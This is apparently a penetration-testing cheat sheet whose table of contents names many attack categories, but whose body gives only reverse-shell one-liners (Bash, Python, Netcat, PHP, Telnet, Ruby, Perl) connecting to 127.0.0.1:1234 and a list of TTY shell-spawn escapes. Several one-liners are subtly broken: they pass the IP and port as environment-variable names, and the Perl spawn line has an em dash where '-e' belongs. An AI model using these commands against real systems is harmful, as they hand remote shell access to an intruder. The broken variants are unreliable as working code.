____

### Reverse shell
* #### [Bash](#reverse_shell_bash)
* #### [Python](#reverse_shell_python)
* #### [Netcat](#reverse_shell_netcat)
* #### [PHP](#reverse_shell_php)
* #### [Telnet](#reverse_shell_telnet)
* #### [Ruby](#reverse_shell_ruby)
* #### [Perl](#reverse_shell_perl)
### TTY Spawn Shell
* #### [Python spawn shell](#python_spawn_shell)
* #### [OS system spawn shell](#os_system_spawn_shell)
* #### [Bash spawn shell](#bash_spawn_shell)
* #### [Perl spawn shell](#perl_spawn_shell)
* #### [Ruby spawn shell](#ruby_spawn_shell)
* #### [Lua spawn shell](#lua_spawn_shell)
* #### [IRB spawn shell](#irb_spawn_shell)
* #### [VI spawn shell](#vi_spawn_shell)
* #### [VI(2) spawn shell](#vi2_spawn_shell)
* #### [Nmap spawn shell](#nmap_spawn_shell)
### PHP Reverse Shell
* #### [RCE](#rce)
* #### [Obfuscate PHP Web Shell](#obfuscate_php_web_shell)
* #### [PHP Reverse Shell](#php_reverse_shell)
### LFI
* #### [Directory Traversal](#directory_traversal)
* #### [PHP Wrapper php://file](#php_wrapper_file)
* #### [PHP Wrapper php://filter](#php_wrapper_filter)
* #### [Useful LFI files (Linux)](#useful_lfi_linux)
* #### [Useful LFI files (Apache)](#useful_lfi_apache)
* #### [Useful LFI files (MySQL)](#useful_lfi_mysql)
* #### [Useful LFI files (Windows)](#useful_lfi_windows)
### XSS
* #### [Data grabber for XSS](#data_grabber_xss)
* #### [XSS in HTML/Applications](#xss_in_app)
  * ##### [Basic Payload](#basic_payload)
  * ##### [Img tag payload](#img_tag_payload)
* #### [XSS in Markdown](#xss_in_markdown)
* #### [XSS in SVG](#xss_in_svg)
* #### [Bypass word blacklist with code evaluation](#bypass_word_blacklist_with_code_evaluation)
### SQL Injection Payloads
* #### [Generic SQL Injection](#generic_sql_injection)
* #### [Time-Based](#time_based)
* #### [Generic Error Based Payloads](#generic_error_based_payloads)
* #### [Authentication Based Payloads](#authentication_based_payloads)
* #### [Order by and UNION Based Payloads](#order_by_and_union_based_payloads)
### Useful Linux command
* #### [SUID Commands](#suid_commands)
* #### [System Version](#system_version)
* #### [Environment Variables](#environment_variables)
* #### [Service Settings](#service_settings)
* #### [Cron Jobs](#cron_jobs)
* #### [Other Users](#other_users)
* #### [Port Forwarding](#port_forwarding)
* #### [TAR Wildcard Cronjob Privilege Escalation](#tar_wildcard_cronjob_privilege_escalation)
### File Transfer
* #### [Bash Upload](#bash_upload)
* #### [Bash Download](#bash_download)
* #### [Netcat](#netcat)
* #### [Python](#python)
* #### [SCP](#scp)

____

### Reverse shell > <a name="reverse_shell_bash"></a>Bash
###### bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1234 <&1'

### Reverse shell > <a name="reverse_shell_python"></a>Python
```python  
python -c 'import sys,socket,os,pty;s=socket.socket()
  s.connect((os.getenv("127.0.0.1"),int(os.getenv("1234"))))
  [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
  pty.spawn("/bin/sh")'
```

### Reverse shell > <a name="reverse_shell_netcat"></a>Netcat
###### rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f

### Reverse shell > <a name="reverse_shell_php"></a>PHP
###### php -r '$sock=fsockopen(getenv("127.0.0.1"),getenv("1234"));exec("/bin/sh -i <&3 >&3 2>&3");'

### Reverse shell > <a name="reverse_shell_telnet"></a>Telnet
###### TF=$(mktemp -u); mkfifo $TF && telnet 127.0.0.1 1234 0<$TF | /bin/sh 1>$TF

### Reverse shell > <a name="reverse_shell_ruby"></a>Ruby
###### ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["127.0.0.1"],ENV["1234"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

### Reverse shell > <a name="reverse_shell_perl"></a>Perl
###### perl -e 'use Socket;$i="$ENV{127.0.0.1}";$p=$ENV{1234};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

____

### TTY Spawn Shell > <a name="python_spawn_shell"></a>Python spawn shell
###### python -c 'import pty; pty.spawn("/bin/sh")'

### TTY Spawn Shell > <a name="os_system_spawn_shell"></a>OS system spawn shell
###### echo os.system("/bin/bash")

### TTY Spawn Shell > <a name="bash_spawn_shell"></a>Bash spawn shell
###### /bin/sh -i

### TTY Spawn Shell > <a name="perl_spawn_shell"></a>Perl spawn shell
###### perl —e 'exec "/bin/sh";'

### TTY Spawn Shell > <a name="ruby_spawn_shell"></a>Ruby spawn shell
###### ruby: exec "/bin/sh"

### TTY Spawn Shell > <a name="lua_spawn_shell"></a>Lua spawn shell
###### lua: os.execute("/bin/sh")

### TTY Spawn Shell > <a name="irb_spawn_shell"></a>IRB spawn shell
###### exec "/bin/sh"

### TTY Spawn Shell > <a name="vi_spawn_shell"></a>VI spawn shell
###### :!bash

### TTY Spawn Shell > <a name="vi2_spawn_shell"></a>VI(2) spawn shell
###### :set shell=/bin/bash:shell

### TTY Spawn Shell > <a name="nmap_spawn_shell"></a>Nmap spawn shell
###### !sh
